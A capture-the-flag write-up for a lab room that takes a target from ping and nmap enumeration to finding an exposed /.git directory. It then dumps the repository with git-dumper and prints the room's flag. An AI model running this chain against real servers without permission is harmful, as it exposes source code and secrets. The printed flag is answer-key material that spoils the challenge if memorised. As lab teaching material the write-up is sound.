# Room 404 Write-Up

## 1. Target Information

**Target IP:** `10.128.191.40`

The first step was to check whether the target machine was reachable.

```bash
ping 10.128.191.40
```

The target responded to the ICMP requests, confirming that the machine was reachable.

---

## 2. Port Scanning and Service Enumeration

I then performed an Nmap scan using `-sV` for service/version detection, `-sC` to run Nmap's default scripts, and `-oN` to save the results to a file named `scan`.

```bash
nmap -sV -sC -oN scan 10.128.191.40
```

The scan revealed two open TCP ports:

|Port|State|Service|
|---|---|---|
|22/tcp|open|SSH|
|8080/tcp|open|HTTP|

The `-sC` default scripts also revealed an interesting discovery on the web service:

```text
10.128.191.40:8080/.git/
```

This indicated that the web server was exposing a **Git repository** through the `.git` directory.

---

## 3. Dumping the Git Repository

Since the `.git` directory was accessible, I used `git-dumper` to reconstruct the exposed Git repository.

```bash
git-dumper http://10.128.191.40:8080/.git output
```

The command downloaded the accessible Git repository contents into a local directory named `output`.

After checking the recovered files:

```bash
ls output
```

I found a `README.md` file.

---

## 4. Reading the README

I opened the README file:

```bash
cat output/README.md
```

The file contained the flag:

```text
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

## Flag

```text
THM{byt3_l0tus_n3v3r_f0rg3ts}
```

## Summary

The attack path was straightforward:

```text
Target IP
   ↓
Ping
   ↓
Nmap enumeration
   ↓
Port 8080 discovered
   ↓
/.git/ exposed
   ↓
git-dumper
   ↓
README.md
   ↓
Flag
```

### Key Takeaway

The main vulnerability was the exposure of the `.git` directory through the web server. If a real production server exposes `.git`, an attacker may be able to reconstruct source code and potentially recover sensitive information from the repository and its history.